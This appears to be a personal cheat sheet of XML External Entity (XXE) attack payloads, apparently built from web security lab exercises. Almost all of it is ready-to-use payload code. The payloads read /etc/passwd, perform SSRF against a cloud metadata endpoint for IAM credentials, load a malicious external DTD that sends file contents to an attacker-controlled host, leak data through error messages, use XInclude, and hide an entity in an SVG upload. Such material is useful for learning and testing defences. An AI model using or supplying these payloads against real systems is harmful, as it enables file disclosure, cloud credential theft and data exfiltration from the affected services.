# XXE File read
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&ent;</productId><storeId>&ent;</storeId></stockCheck>
```


# XXE perform SSRF
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE message [
  <!ENTITY ext SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin">
]>
<stockCheck><productId>
&ext;</productId><storeId>1</storeId></stockCheck>
```


# XXE out-of-band interaction
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE message [
  <!ENTITY % ext SYSTEM "http://fveu5qceic8nh6ysp64k7y5x9off37rw.oastify.com"> %ext;]>
<stockCheck>
<productId>1</productId>
<storeId>1</storeId>
</stockCheck>
```


# Exploiting blind XXE to exfiltrate data using a malicious external DTD. 
It basically works like RFI. Loads DTD from malicious server. That laoded DTD sends request to malicious server by setting x parameter to file's content. An attacker then can check his/her webserver's logs to see exfiltirated data. If exfiltirated data would be more than a single line, it would not show the whole content in web server's logs, in such cases hosting FTP would be beneficial to retrieve all the lines.

Host DTD in webserver to be loaded later : https://domain/exploit
```
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://domain/?x=%file;'>">
%eval;
%exfil;
```

Send in request
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://domain/exploit"> %xxe;]>
<productId>1</productId><storeId>1</storeId></stockCheck>
```


# Exploiting blind XXE to retrieve data via error messages. 
It also works as the above one. 
```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
%eval;
%exfil;
```

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://domain/exploit"> %xxe;]>
<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```


# Exploiting XInclude to retrieve files
```
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo> 
```


# XXE image
```
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
<text font-size="16" x="0" y="16">&xxe;</text>
</svg> 
```